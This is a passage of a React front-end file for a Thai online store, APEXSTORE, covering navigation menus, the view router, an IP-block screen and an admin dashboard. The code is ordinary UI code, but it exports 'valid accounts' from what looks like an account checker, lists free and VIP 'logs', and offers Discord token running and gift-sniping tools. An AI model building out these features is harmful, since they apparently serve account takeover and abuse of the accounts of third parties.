      `All_Valid_Detailed_${new Date().toISOString().slice(0, 10)}.txt`,
      text,
    );
    Swal.fire({
      title: "สำเร็จ",
      text: "บันทึกไฟล์รายละเอียดสำเร็จ",
      icon: "success",
    });
  };

  const downloadValidDetail = () => {
    if (!validAccounts.length)
      return Swal.fire({
        title: "ข้อมูล",
        text: "ไม่มีข้อมูลบัญชีที่ผ่าน",
        icon: "info",
      });
    const content = JSON.stringify(validAccounts, null, 2);
    downloadFile(
      `Apex_Database_Export_${new Date().toISOString().slice(0, 10)}.json`,
      content,
    );
    Swal.fire({
      title: "สำเร็จ",
      text: "ส่งออกฐานข้อมูลสำเร็จ",
      icon: "success",
      background: "#09090b",
      color: "#fff",
    });
  };

  const [useCustomCursor, setUseCustomCursor] = useState(() => {
    // Disable custom cursor automatically on touch devices (pointer: coarse)
    if (typeof window !== 'undefined' && window.matchMedia("(pointer: coarse)").matches) {
      return false;
    }
    const saved = localStorage.getItem('apexstore_custom_cursor');
    return saved !== 'false'; // default to true
  });

  const toggleCustomCursor = () => {
    setUseCustomCursor(prev => {
      const next = !prev;
      localStorage.setItem('apexstore_custom_cursor', String(next));
      if (!next) {
        document.body.style.cursor = 'auto';
        document.documentElement.style.cursor = 'auto';
        // Remove style tag if existing
        const styleId = 'custom-cursor-style-override';
        const el = document.getElementById(styleId);
        if (el) el.remove();
      } else {
        // We let CustomCursor handle it
      }
      return next;
    });
  };

  if (isIPBlocked)
    return (
      <div className="min-h-screen bg-[#09090b] flex items-center justify-center p-4">
        <div className="w-full max-w-lg bg-primary text-primary-foreground border border-[#10b981]/20 p-12 text-center relative overflow-hidden">
          <ShieldAlert className="w-20 h-20 text-[#10b981] mx-auto mb-6 " />
          <h1 className="text-3xl font-medium text-[#10b981] mb-4 uppercase tracking-tighter">
            Access Revoked
          </h1>
          <p className="text-muted-foreground text-sm leading-relaxed mb-8">
            ที่อยู่ IP ของคุณ ({clientIp})
            ถูกระงับการเข้าถึงระบบเนื่องจากละเมิดข้อตกลงการใช้งานหรือพบพฤติกรรมที่น่าสงสัย
            หากคุณคิดว่าเป็นความผิดพลาด กรุณาติดต่อผู้ดูแลระบบ APEXSTORE
          </p>
          <div className="bg-[#09090b] p-4 text-[10px] text-muted-foreground font-mono mb-8">
            Error Code: APEXSTORE_SECURITY_BLOCK_L4
          </div>
          <button
            onClick={() => window.location.reload()}
            className="bg-primary text-primary-foreground hover:bg-[#10b981] text-white px-8 py-3 text-xs font-medium transition-all"
          >
            TRY RECONNECTING
          </button>
        </div>
      </div>
    );

  const getViewTitle = () => {
    switch (activeView) {
      case "home": return "หน้าหลัก";
      case "categories": return "สินค้าทั้งหมด";
      case "category_products": return "หมวดหมู่สินค้า";
      case "product_detail": return "รายละเอียดสินค้า";
      case "wallet": return "เติมเงิน";
      case "my_orders": return "คำสั่งซื้อของฉัน";
      case "settings": return "การตั้งค่าผู้ใช้";
      case "wallet_history": return "ประวัติเติมเงิน";
      case "random_history": return "ประวัติการสุ่มสินค้า";
      case "admin": return "จัดการหลังบ้าน";
      case "telegram_catcher": return "ดักซองเทเลแกรม";
      case "discord_catcher": return "ดักซองดิสคอร์ด";
      case "discord_on": return "รันโทเค่นดิสคอร์ด";
      case "discord_badge": return "รับตราอัตโนมัติ";
      case "two_fa_generator": return "สร้างรหัส 2FA";
      case "proxy_free": return "พร็อกซี่ฟรี (Proxy)";
      default: return "APEXSTORE";
    }
  };

  const isHomeViewReady = (Array.isArray(products) && Array.isArray(categories) && siteSettings !== null) || forceReveal;
  const isLoadingSkeleton = !isLoaded || (!isHomeViewReady && !dbErrorDetail);

  return (
    <div className="min-h-screen w-full bg-[#000000] text-white font-sans selection:bg-[#050505]/80 flex flex-col lg:flex-row relative">
      {useCustomCursor && <CustomCursor />}
      {/* Popup banner removed as requested */}

      {/* Desktop Sidebar */}
      <aside className="hidden lg:flex flex-col w-[260px] bg-[#000000] border-r border-[#1e1e1e] h-screen sticky top-0 shrink-0 overflow-y-auto no-scrollbar z-[70] select-none text-[13px]">
        {/* Brand Header */}
        <div className="px-5 pt-6 pb-4 w-full flex flex-col justify-start shrink-0">
          <div className="flex items-center gap-3 w-full">
            <img
              src="https://img2.pic.in.th/983B3DCE-90A3-4822-8940-D6B81CCA63A3.png"
              alt="APEXSTORE Logo"
              className="h-8 object-contain cursor-pointer"
              onClick={handleLogoClick}
            />
          </div>
        </div>

        <div className="flex-1 px-3 space-y-6 pb-8">
          
          {/* Main Menu */}
          <div>
            <div className="px-3 mb-2 text-[10px] font-semibold text-zinc-500 tracking-wider">NAVIGATION</div>
            <div className="flex flex-col gap-0.5">
              <button onClick={() => { setActiveView("home"); window.scrollTo({ top: 0, behavior: "smooth" }); }} className={`w-full flex items-center gap-3 px-3 py-1.5 rounded-md transition-all ${activeView === "home" ? "bg-white/[0.06] text-white font-medium" : "text-zinc-400 hover:text-white hover:bg-white/[0.04]"}`}>
                <Home className="w-4 h-4" /> หน้าแรก
              </button>
              <button onClick={() => { setActiveView("categories"); window.scrollTo({ top: 0, behavior: "smooth" }); }} className={`w-full flex items-center gap-3 px-3 py-1.5 rounded-md transition-all ${(activeView === "categories" || activeView === "category_products") ? "bg-white/[0.06] text-white font-medium" : "text-zinc-400 hover:text-white hover:bg-white/[0.04]"}`}>
                <ShoppingCart className="w-4 h-4" /> สินค้าทั้งหมด
              </button>
              <button onClick={() => { setActiveView(user ? "wallet" : "login"); window.scrollTo({ top: 0, behavior: "smooth" }); }} className={`w-full flex items-center gap-3 px-3 py-1.5 rounded-md transition-all ${activeView === "wallet" ? "bg-white/[0.06] text-white font-medium" : "text-zinc-400 hover:text-white hover:bg-white/[0.04]"}`}>
                <Wallet className="w-4 h-4" /> เติมเงิน
              </button>
              <button onClick={() => { setActiveView(user ? "my_orders" : "login"); window.scrollTo({ top: 0, behavior: "smooth" }); }} className={`w-full flex items-center gap-3 px-3 py-1.5 rounded-md transition-all ${activeView === "my_orders" ? "bg-white/[0.06] text-white font-medium" : "text-zinc-400 hover:text-white hover:bg-white/[0.04]"}`}>
                <Package className="w-4 h-4" /> ออเดอร์
              </button>
              <button onClick={() => { setShowSearchPopup(true); }} className="w-full flex items-center gap-3 px-3 py-1.5 rounded-md transition-all text-zinc-400 hover:text-white hover:bg-white/[0.04]">
                <Search className="w-4 h-4" /> ค้นหาสินค้า
              </button>
            </div>
          </div>

          {/* Account */}
          {user ? (
            <div>
              <div className="px-3 mb-2 text-[10px] font-semibold text-zinc-500 tracking-wider">ACCOUNT</div>
              <div className="flex flex-col gap-0.5">
                <button onClick={() => { setActiveView("profile"); window.scrollTo({ top: 0, behavior: "smooth" }); }} className={`w-full flex items-center justify-between px-3 py-1.5 rounded-md transition-all ${activeView === "profile" ? "bg-white/[0.06] text-white font-medium" : "text-zinc-400 hover:text-white hover:bg-white/[0.04]"}`}>
                  <div className="flex items-center gap-3">
                    <User className="w-4 h-4" /> {userPlan?.username || user?.email?.split("@")[0]}
                  </div>
                  {userPlan?.isPremium && <Crown className="w-3.5 h-3.5 text-amber-500" />}
                </button>
                <div className="px-3 py-2 my-1 bg-[#09090b] border border-[#1e1e1e] rounded-md flex items-center justify-between text-xs cursor-default">
                  <span className="text-zinc-500">ยอดเงิน</span>
                  <span className="font-mono text-[#10b981]">{Math.floor(userPlan?.balance || 0).toLocaleString()} ฿</span>
                </div>
                <button onClick={() => { setActiveView("settings"); window.scrollTo({ top: 0, behavior: "smooth" }); }} className={`w-full flex items-center gap-3 px-3 py-1.5 rounded-md transition-all ${activeView === "settings" ? "bg-white/[0.06] text-white font-medium" : "text-zinc-400 hover:text-white hover:bg-white/[0.04]"}`}>
                  <Settings className="w-4 h-4" /> ตั้งค่า
                </button>
                <button onClick={() => { setActiveView("wallet_history"); window.scrollTo({ top: 0, behavior: "smooth" }); }} className={`w-full flex items-center gap-3 px-3 py-1.5 rounded-md transition-all ${activeView === "wallet_history" ? "bg-white/[0.06] text-white font-medium" : "text-zinc-400 hover:text-white hover:bg-white/[0.04]"}`}>
                  <Wallet className="w-4 h-4" /> ประวัติเติมเงิน
                </button>
              </div>
            </div>
          ) : (
             <div>
              <div className="px-3 mb-2 text-[10px] font-semibold text-zinc-500 tracking-wider">ACCOUNT</div>
              <div className="flex flex-col gap-2 px-3">
                <button onClick={() => { setActiveView("login"); window.scrollTo({ top: 0, behavior: "smooth" }); }} className="w-full flex items-center justify-center py-1.5 bg-white text-black font-medium rounded-md transition-all active:scale-95">เข้าสู่ระบบ</button>
                <button onClick={() => { setActiveView("signup"); window.scrollTo({ top: 0, behavior: "smooth" }); }} className="w-full flex items-center justify-center py-1.5 bg-[#111] text-white font-medium rounded-md border border-[#222] transition-all hover:bg-[#222] active:scale-95">สมัครสมาชิก</button>
              </div>
             </div>
          )}

          {/* Tools */}
          {user && (
            <div>
              <div className="px-3 mb-2 text-[10px] font-semibold text-zinc-500 tracking-wider">UTILITIES</div>
              <div className="flex flex-col gap-0.5">
                {["telegram_catcher:ดักซองเทเลแกรม", "discord_catcher:ดักซองดิสคอร์ด", "discord_on:รันโทเค่นดิสคอร์ด", "discord_badge:รับตราอัตโนมัติ", "two_fa_generator:สร้างรหัส 2FA", "proxy_free:พร็อกซี่ฟรี"].map(str => {
                   const [vid, lbl] = str.split(':');
                   return (
                     <button key={vid} onClick={() => setActiveView(vid)} className={`w-full flex items-center gap-3 px-3 py-1.5 rounded-md transition-all ${activeView === vid ? "bg-white/[0.06] text-white font-medium" : "text-zinc-400 hover:text-white hover:bg-white/[0.04]"}`}>
                       <ArrowUpRight className="w-4 h-4" /> {lbl}
                     </button>
                   );
                })}
              </div>
            </div>
          )}

          {/* Custom Pages */}
          {user && customPages && customPages.length > 0 && (
            <div>
              <div className="px-3 mb-2 text-[10px] font-semibold text-zinc-500 tracking-wider">PAGES</div>
              <div className="flex flex-col gap-0.5">
                {customPages.map((page) => (
                  <button
                    key={page.id}
                    onClick={() => { setSelectedPage(page); setActiveView("custom_page"); window.scrollTo({ top: 0, behavior: "smooth" }); }}
                    className={`w-full flex items-center gap-3 px-3 py-1.5 rounded-md transition-all ${activeView === "custom_page" && selectedPage?.id === page.id ? "bg-white/[0.06] text-white font-medium" : "text-zinc-400 hover:text-white hover:bg-white/[0.04]"}`}
                  >
                    <FileText className="w-4 h-4 shrink-0" />
                    <span className="truncate">{page.title.replace(/^#+\s*/, "")}</span>
                  </button>
                ))}
              </div>
            </div>
          )}

          {/* Admin / Logout */}
          {user && (
            <div>
              <div className="h-px bg-[#1e1e1e] mb-3 mt-1 mx-3" />
              <div className="flex flex-col gap-0.5">
                {isAdmin && (
                  <button onClick={() => { setActiveView("admin"); window.scrollTo({ top: 0, behavior: "smooth" }); }} className={`w-full flex items-center gap-3 px-3 py-1.5 rounded-md transition-all ${activeView === "admin" ? "bg-white/[0.06] text-white font-medium" : "text-zinc-400 hover:text-white hover:bg-white/[0.04]"}`}>
                    <ShieldCheck className="w-4 h-4" /> จัดการระบบ
                  </button>
                )}
                <button onClick={handleLogout} className="w-full flex items-center gap-3 px-3 py-1.5 rounded-md transition-all text-red-500/80 hover:text-red-500 hover:bg-red-500/10">
                  <LogOut className="w-4 h-4" /> ออกจากระบบ
                </button>
              </div>
            </div>
          )}
        </div>
      </aside>
{/* Main Content Area */}
      <div className="flex-1 flex flex-col min-h-screen min-w-0 relative overflow-x-hidden">
        {/* Top Header */}
        <header className="sticky top-0 z-[60] w-full bg-[#000000] border-b border-[#1e1e1e] flex-shrink-0 select-none">
          <div className="flex items-center justify-between h-[80px] px-4 md:px-8 max-w-7xl mx-auto w-full">
            {/* Logo with matching Icon size */}
            <div 
              className="flex items-center gap-3 select-none flex-shrink-0 cursor-pointer hover:scale-[1.02] active:scale-95 transition-all duration-200 group lg:hidden" 
              onClick={() => {
                setActiveView("home");
                window.scrollTo({ top: 0, behavior: "smooth" });
              }}
            >
              <img src="https://img2.pic.in.th/983B3DCE-90A3-4822-8940-D6B81CCA63A3.png" alt="APEXSTORE Logo" className="h-[44px] md:h-[50px] object-contain" />
            </div>

            <div className="hidden lg:flex items-center gap-2 select-none">
              <span className="text-sm font-semibold tracking-[0.1em] text-white/90 uppercase">
                {getViewTitle()}
              </span>
            </div>

            {/* Right Section */}
            <div className="flex items-center gap-2 md:gap-4">
              
              {/* Search Button */}
              <button
                onClick={() => setShowSearchPopup(true)}
                className="w-[44px] h-[44px] rounded-md flex items-center justify-center text-white/50 hover:text-white bg-white/[0.04] hover:bg-white/[0.08] border border-[#1e1e1e] transition-all duration-200 active:scale-95 cursor-pointer"
                aria-label="Search"
              >
                <Search className="w-5 h-5 stroke-[2.5px]" />
              </button>

              {/* Hamburger Trigger */}
              <motion.button
                whileTap={{ scale: 0.9 }}
                onClick={() => setIsMobileMenuOpen(!isMobileMenuOpen)}
                className="w-10 h-10 flex flex-col justify-center items-center gap-[5px] bg-white/[0.04] hover:bg-white/[0.08] border border-[#1e1e1e] transition-all duration-200 active:scale-95 cursor-pointer rounded-md ml-1 lg:hidden text-white relative z-[100]"
                aria-label="Menu"
              >
                <motion.div 
                  animate={{
                    rotate: isMobileMenuOpen ? 45 : 0,
                    y: isMobileMenuOpen ? 6.5 : 0,
                  }}
                  transition={{ duration: 0.3, ease: "easeInOut", delay: isMobileMenuOpen ? 0.2 : 0 }}
                  className="w-5 h-[1.5px] bg-white rounded-full" 
                />
                <motion.div 
                  animate={{
                    opacity: isMobileMenuOpen ? 0 : 1,
                    scale: isMobileMenuOpen ? 0 : 1,
                  }}
                  transition={{ duration: 0.2, ease: "easeInOut", delay: isMobileMenuOpen ? 0 : 0.2 }}
                  className="w-5 h-[1.5px] bg-white rounded-full" 
                />
                <motion.div 
                  animate={{
                    rotate: isMobileMenuOpen ? -45 : 0,
                    y: isMobileMenuOpen ? -6.5 : 0,
                  }}
                  transition={{ duration: 0.3, ease: "easeInOut", delay: isMobileMenuOpen ? 0.2 : 0 }}
                  className="w-5 h-[1.5px] bg-white rounded-full" 
                />
              </motion.button>
            </div>
          </div>
        </header>

        {/* Mobile Menu Dropdown */}
        <AnimatePresence>
          {isMobileMenuOpen && (
            <>
              <motion.div
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
                onClick={() => setIsMobileMenuOpen(false)}
                className="fixed inset-0 bg-black/75 backdrop-blur-md z-[90] lg:hidden animate-fade-in"
              />
              <motion.div
                initial={{ x: "100%" }}
                animate={{ x: 0 }}
                exit={{ x: "100%" }}
                transition={{ type: "spring", stiffness: 350, damping: 28 }}
                className="fixed top-0 right-0 bottom-0 h-screen w-full max-w-[320px] bg-[#101014] z-[95] flex flex-col lg:hidden overflow-y-auto no-scrollbar border-l border-[#1e1e1e] shadow-sm]"
              >
                {/* Header */}
                <div className="flex items-center justify-between px-6 pt-5 pb-5 shrink-0 relative z-[70] border-b border-[#1e1e1e]">
                  <span className="text-2xl font-semibold text-white hover:opacity-90 transition-opacity">เมนูหลัก</span>
                  <button
                    onClick={() => setIsMobileMenuOpen(false)}
                    className="w-10 h-10 rounded-full flex items-center justify-center bg-white/[0.04] hover:bg-white/[0.08] text-zinc-400 hover:text-white border border-[#1e1e1e] transition-all cursor-pointer active:scale-95"
                  >
                    <X className="w-5 h-5" />
                  </button>
                </div>

                {/* Menu Items */}
                <div className="flex-1 px-3 space-y-6 overflow-y-auto no-scrollbar pb-8 mt-6 select-none text-[13px]">
                  
                  {/* Main Menu */}
                  <div>
                    <div className="px-3 mb-2 text-[10px] font-semibold text-zinc-500 tracking-wider">NAVIGATION</div>
                    <div className="flex flex-col gap-0.5">
                      <button onClick={() => { setActiveView("home"); setIsMobileMenuOpen(false); }} className={`w-full flex items-center gap-3 px-3 py-2 rounded-md transition-all ${activeView === "home" ? "bg-white/[0.06] text-white font-medium" : "text-zinc-400 hover:text-white"}`}>
                        <Home className="w-4 h-4" /> หน้าแรก
                      </button>
                      <button onClick={() => { setActiveView("categories"); setIsMobileMenuOpen(false); }} className={`w-full flex items-center gap-3 px-3 py-2 rounded-md transition-all ${(activeView === "categories" || activeView === "category_products") ? "bg-white/[0.06] text-white font-medium" : "text-zinc-400 hover:text-white"}`}>
                        <ShoppingCart className="w-4 h-4" /> สินค้าทั้งหมด
                      </button>
                      <button onClick={() => { setActiveView(user ? "wallet" : "login"); setIsMobileMenuOpen(false); }} className={`w-full flex items-center gap-3 px-3 py-2 rounded-md transition-all ${activeView === "wallet" ? "bg-white/[0.06] text-white font-medium" : "text-zinc-400 hover:text-white"}`}>
                        <Wallet className="w-4 h-4" /> เติมเงิน
                      </button>
                      <button onClick={() => { setActiveView(user ? "my_orders" : "login"); setIsMobileMenuOpen(false); }} className={`w-full flex items-center gap-3 px-3 py-2 rounded-md transition-all ${activeView === "my_orders" ? "bg-white/[0.06] text-white font-medium" : "text-zinc-400 hover:text-white"}`}>
                        <Package className="w-4 h-4" /> ออเดอร์
                      </button>
                      <button onClick={() => { setShowSearchPopup(true); setIsMobileMenuOpen(false); }} className="w-full flex items-center gap-3 px-3 py-2 rounded-md transition-all text-zinc-400 hover:text-white">
                        <Search className="w-4 h-4" /> ค้นหาสินค้า
                      </button>
                    </div>
                  </div>

                  {/* Account */}
                  {user ? (
                    <div>
                      <div className="px-3 mb-2 text-[10px] font-semibold text-zinc-500 tracking-wider">ACCOUNT</div>
                      <div className="flex flex-col gap-0.5">
                        <button onClick={() => { setActiveView("profile"); setIsMobileMenuOpen(false); }} className={`w-full flex items-center justify-between px-3 py-2 rounded-md transition-all ${activeView === "profile" ? "bg-white/[0.06] text-white font-medium" : "text-zinc-400 hover:text-white"}`}>
                          <div className="flex items-center gap-3">
                            <User className="w-4 h-4" /> {userPlan?.username || user?.email?.split("@")[0]}
                          </div>
                          {userPlan?.isPremium && <Crown className="w-3.5 h-3.5 text-amber-500" />}
                        </button>
                        <div className="px-3 py-2.5 my-1 bg-[#09090b] border border-[#1e1e1e] rounded-md flex items-center justify-between text-xs m-2">
                          <span className="text-zinc-500">ยอดเงิน</span>
                          <span className="font-mono text-[#10b981]">{Math.floor(userPlan?.balance || 0).toLocaleString()} ฿</span>
                        </div>
                        <button onClick={() => { setActiveView("settings"); setIsMobileMenuOpen(false); }} className={`w-full flex items-center gap-3 px-3 py-2 rounded-md transition-all ${activeView === "settings" ? "bg-white/[0.06] text-white font-medium" : "text-zinc-400 hover:text-white"}`}>
                          <Settings className="w-4 h-4" /> ตั้งค่า
                        </button>
                        <button onClick={() => { setActiveView("wallet_history"); setIsMobileMenuOpen(false); }} className={`w-full flex items-center gap-3 px-3 py-2 rounded-md transition-all ${activeView === "wallet_history" ? "bg-white/[0.06] text-white font-medium" : "text-zinc-400 hover:text-white"}`}>
                          <Wallet className="w-4 h-4" /> ประวัติเติมเงิน
                        </button>
                      </div>
                    </div>
                  ) : (
                    <div>
                      <div className="px-3 mb-2 text-[10px] font-semibold text-zinc-500 tracking-wider">ACCOUNT</div>
                      <div className="flex flex-col gap-2 px-3 pb-2">
                        <button onClick={() => { setActiveView("login"); setIsMobileMenuOpen(false); }} className="w-full flex items-center justify-center py-2 bg-white text-black font-medium rounded-md transition-all active:scale-95">เข้าสู่ระบบ</button>
                        <button onClick={() => { setActiveView("signup"); setIsMobileMenuOpen(false); }} className="w-full flex items-center justify-center py-2 bg-[#111] text-white font-medium rounded-md border border-[#222] transition-all hover:bg-[#222] active:scale-95">สมัครสมาชิก</button>
                      </div>
                    </div>
                  )}

                  {/* Tools */}
                  {user && (
                    <div>
                      <div className="px-3 mb-2 text-[10px] font-semibold text-zinc-500 tracking-wider">UTILITIES</div>
                      <div className="flex flex-col gap-0.5">
                        {["telegram_catcher:ดักซองเทเลแกรม", "discord_catcher:ดักซองดิสคอร์ด", "discord_on:รันโทเค่นดิสคอร์ด", "discord_badge:รับตราอัตโนมัติ", "two_fa_generator:สร้างรหัส 2FA", "proxy_free:พร็อกซี่ฟรี"].map(str => {
                          const [vid, lbl] = str.split(':');
                          return (
                            <button key={vid} onClick={() => { setActiveView(vid); setIsMobileMenuOpen(false); }} className={`w-full flex items-center gap-3 px-3 py-2 rounded-md transition-all ${activeView === vid ? "bg-white/[0.06] text-white font-medium" : "text-zinc-400 hover:text-white"}`}>
                              <ArrowUpRight className="w-4 h-4" /> {lbl}
                            </button>
                          );
                        })}
                      </div>
                    </div>
                  )}

                  {/* Custom Pages */}
                  {user && customPages && customPages.length > 0 && (
                    <div>
                      <div className="px-3 mb-2 text-[10px] font-semibold text-zinc-500 tracking-wider">PAGES</div>
                      <div className="flex flex-col gap-0.5">
                        {customPages.map((page) => (
                          <button
                            key={page.id}
                            onClick={() => { setSelectedPage(page); setActiveView("custom_page"); setIsMobileMenuOpen(false); }}
                            className={`w-full flex items-center gap-3 px-3 py-2 rounded-md transition-all ${activeView === "custom_page" && selectedPage?.id === page.id ? "bg-white/[0.06] text-white font-medium" : "text-zinc-400 hover:text-white"}`}
                          >
                            <FileText className="w-4 h-4 shrink-0" />
                            <span className="truncate">{page.title.replace(/^#+\s*/, "")}</span>
                          </button>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Admin / Logout */}
                  {user && (
                    <div>
                      <div className="h-px bg-[#1e1e1e] mb-3 mt-1 mx-3" />
                      <div className="flex flex-col gap-0.5">
                        {isAdmin && (
                          <button onClick={() => { setActiveView("admin"); setIsMobileMenuOpen(false); }} className={`w-full flex items-center gap-3 px-3 py-2 rounded-md transition-all ${activeView === "admin" ? "bg-white/[0.06] text-white font-medium" : "text-zinc-400 hover:text-white"}`}>
                            <ShieldCheck className="w-4 h-4" /> จัดการระบบ
                          </button>
                        )}
                        <button onClick={() => { handleLogout(); setIsMobileMenuOpen(false); }} className="w-full flex items-center gap-3 px-3 py-2 rounded-md transition-all text-red-500/80 hover:text-red-500 hover:bg-red-500/10">
                          <LogOut className="w-4 h-4" /> ออกจากระบบ
                        </button>
                      </div>
                    </div>
                  )}
                </div>
                
<div className="flex-grow min-h-[40px]" />
              </motion.div>
            </>
          )}
        </AnimatePresence>

        {/* Verification Banner Removed */}

        {/* Global Page Header Removed */}

        <div className="max-w-7xl mx-auto px-4 sm:px-6 pt-0 sm:pt-2 pb-6 lg:pb-0 w-full flex-1 flex flex-col">
          <Suspense
            fallback={
              <div className="flex-1 w-full flex items-center justify-center min-h-[50vh]">
                <div className="w-8 h-8  border-[#1e1e1e] border-t-white rounded-full animate-spin" />
              </div>
            }
          >
          <AnimatePresence mode="wait">
            <motion.div
              key={activeView}
              initial={{ opacity: 0, y: 15 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -15 }}
              transition={{ duration: 0.2, ease: "easeOut" }}
              className="flex-1 w-full flex flex-col min-h-0"
            >
            {isLoadingSkeleton ? (
              <div className="flex-grow w-full flex items-center justify-center min-h-[50vh]">
                <div className="w-8 h-8  border-[#1e1e1e] border-t-white rounded-full animate-spin" />
              </div>
            ) : (
              <>
                {activeView === "categories" && (
              <CategoriesView
                categories={categories}
                products={products}
                siteSettings={siteSettings}
                onBack={() => setActiveView("home")}
                onSelectCategory={(cat) => {
                  setSelectedCategory(cat);
                  setActiveView("category_products");
                }}
              />
            )}
            {activeView === "category_products" && selectedCategory && (
              <CategoryProductsView
                category={selectedCategory}
                categories={categories}
                products={products}
                onBack={() => setActiveView("categories")}
                onProductClick={(id) => {
                  setSelectedProductId(id);
                  setActiveView("product_detail");
                }}
              />
            )}
            {activeView === "home" && (
              <HomeView
                products={products}
                categories={categories}
                stats={siteStats}
                user={userPlan || user}
                siteSettings={siteSettings}
                purchaseHistory={purchaseHistory}
                setActiveView={setActiveView}
                onProductClick={(id) => {
                  setSelectedProductId(id);
                  setActiveView("product_detail");
                }}
                onSelectCategory={(cat) => {
                  setSelectedCategory(cat);
                  setActiveView("category_products");
                }}
              />
            )}
            {activeView === "product_detail" && selectedProductId && (
              <ProductDetailView
                product={products.find((p) => p.id === selectedProductId)!}
                user={user}
                onBack={() => setActiveView("home")}
                handlePurchase={async (p, q) => {
                  await handlePurchase(p, q);
                }}
                setActiveView={setActiveView}
              />
            )}
            {activeView === "contact" && (
              <ContactView
                onBack={() => setActiveView("home")}
                facebookLink={
                  siteSettings?.facebook_link || siteSettings?.contact_line
                }
                discordLink={siteSettings?.discord_link}
                instagramLink={siteSettings?.instagram_link}
                contactEmail={siteSettings?.contact_email}
              />
            )}
            {activeView === "custom_page" && selectedPage && (
              <PageView
                page={selectedPage}
                onBack={() => setActiveView("home")}
              />
            )}
            {activeView === "login" && (
              <AuthView initialMode="login" setActiveView={setActiveView} />
            )}
            {activeView === "signup" && (
              <AuthView initialMode="signup" setActiveView={setActiveView} />
            )}
            {activeView === "profile" && (
              <ProfileView
                user={user}
                userPlan={userPlan}
                setUserPlan={setUserPlan}
                clientIp={clientIp}
                setActiveView={setActiveView}
                handleLogout={handleLogout}
                purchaseHistory={purchaseHistory.filter(
                  (h) => h.uid === user?.id || h.userId === user?.id,
                )}
                usedKeysHistory={usedKeysHistory.filter(
                  (h) => h.uid === user?.id,
                )}
              />
            )}
            {activeView === "two_fa_generator" && <TwoFAGenerator />}
            {activeView === "proxy_free" && <ProxyFreeTool />}
            {activeView === "api_proxy_gen" && <ApiProxyGenTool />}
            {activeView === "auto_deploy" && (
              <AutoDeployTool onBack={() => setActiveView("tools")} />
            )}
            {activeView === "logs" && (
              <HistoryLogsView
                usedKeysHistory={usedKeysHistory.filter(
                  (h) => h.uid === user?.id,
                )}
                purchaseHistory={purchaseHistory.filter(
                  (h) => h.uid === user?.id || h.userId === user?.id,
                )}
                topupHistory={topupHistory.filter(
                  (h) => h.uid === user?.id || h.userId === user?.id,
                )}
              />
            )}
            {(activeView as string) === "checker_logs" && (
              <CheckerLogsView
                logs={logs}
                onBack={() => setActiveView("home")}
              />
            )}
            {activeView === "log_categories" && (
              <LogCategoriesView
                userPlan={userPlan}
                isAdmin={isAdmin}
                onNavigateAction={(action) =>
                  setActiveView(action as void | any)
                }
                filterType="all"
              />
            )}
            {activeView === "vip_logs" && (
              <LogCategoriesView
                userPlan={userPlan}
                isAdmin={isAdmin}
                onNavigateAction={(action) =>
                  setActiveView(action as void | any)
                }
                filterType="vip"
              />
            )}
            {activeView === "free_logs" && (
              <LogCategoriesView
                userPlan={userPlan}
                isAdmin={isAdmin}
                onNavigateAction={(action) =>
                  setActiveView(action as void | any)
                }
                filterType="free"
              />
            )}
            {activeView === "history" && (
              <HistoryView
                purchaseHistory={purchaseHistory.filter(
                  (h) => h.uid === user?.id || h.userId === user?.id,
                )}
                topupHistory={topupHistory.filter(
                  (h) => h.uid === user?.id || h.userId === user?.id,
                )}
                usedKeysHistory={usedKeysHistory.filter(
                  (h) => h.uid === user?.id,
                )}
              />
            )}
            {activeView === "order_history" && (
              <HistoryView
                purchaseHistory={purchaseHistory.filter(
                  (h) => h.uid === user?.id || h.userId === user?.id,
                )}
                topupHistory={topupHistory.filter(
                  (h) => h.uid === user?.id || h.userId === user?.id,
                )}
                usedKeysHistory={usedKeysHistory.filter(
                  (h) => h.uid === user?.id,
                )}
                defaultTab="normal_product"
              />
            )}
            {activeView === "random_history" && (
              <HistoryView
                purchaseHistory={purchaseHistory.filter(
                  (h) => h.uid === user?.id || h.userId === user?.id,
                )}
                topupHistory={topupHistory.filter(
                  (h) => h.uid === user?.id || h.userId === user?.id,
                )}
                usedKeysHistory={usedKeysHistory.filter(
                  (h) => h.uid === user?.id,
                )}
                defaultTab="special_product"
              />
            )}
            {activeView === "wallet_history" && (
              <HistoryView
                purchaseHistory={purchaseHistory.filter(
                  (h) => h.uid === user?.id || h.userId === user?.id,
                )}
                topupHistory={topupHistory.filter(
                  (h) => h.uid === user?.id || h.userId === user?.id,
                )}
                usedKeysHistory={usedKeysHistory.filter(
                  (h) => h.uid === user?.id,
                )}
                defaultTab="topup_gift"
              />
            )}
            {activeView === "my_orders" && (
              <MyOrdersView
                purchaseHistory={purchaseHistory.filter(
                  (h) => h.uid === user?.id || h.userId === user?.id,
                )}
                topupHistory={topupHistory.filter(
                  (h) => h.uid === user?.id || h.userId === user?.id,
                )}
              />
            )}
            {activeView === "settings" && (
              <SettingsView setActiveView={setActiveView} user={user} useCustomCursor={useCustomCursor} toggleCustomCursor={toggleCustomCursor} />
            )}
            {activeView === "tools" && (
              <ToolsView setActiveView={setActiveView} />
            )}
            {activeView === "wallet" && (
              <WalletView
                userPlan={userPlan}
                setUserPlan={setUserPlan}
                userId={user?.uid}
                siteSettings={siteSettings}
                onTopupSuccess={(entry) => {
                  setTopupHistory((prev) => [entry, ...prev]);
                  setSiteStats((prev) => ({
                    ...prev,
                    topups:
                      (prev.topups || 0) + (entry.amount || entry.money || 0),
                  }));
                }}
              />
            )}
            {activeView === "admin" && isAdmin && (
              <AdminDashboard
                totalChecked={totalChecked}
                validAccounts={validAccounts}
                licenseKeys={licenseKeys}
                usedKeysHistory={usedKeysHistory}
                blockedIPs={blockedIPs}
                adminTab={adminTab}
                setAdminTab={setAdminTab}
                isDBReady={isDBReady}
                dbErrorDetail={dbErrorDetail}
                adminUsername={adminUsername}
                setIsAdmin={setIsAdmin}
                addLicenseKey={addLicenseKey}
                blockIP={blockIP}
                deleteKey={deleteKey}
                bulkDeleteKeys={bulkDeleteKeys}
                unblockIP={unblockIP}
                products={products}
                setProducts={setProducts}
                siteStats={siteStats}
                setSiteStats={setSiteStats}
                customPages={customPages}
                setCustomPages={setCustomPages}
                categories={categories}
                setCategories={setCategories}
                usersList={usersList}
                onRefreshData={refreshAllSystemData}
              />
            )}
              </>
            )}
            </motion.div>
          </AnimatePresence>
          </Suspense>
        </div>

        {/* Footer */}
        <footer className="mt-auto pt-16 pb-8 border-t border-[#10b981]/10 relative overflow-hidden bg-[#09090b]">
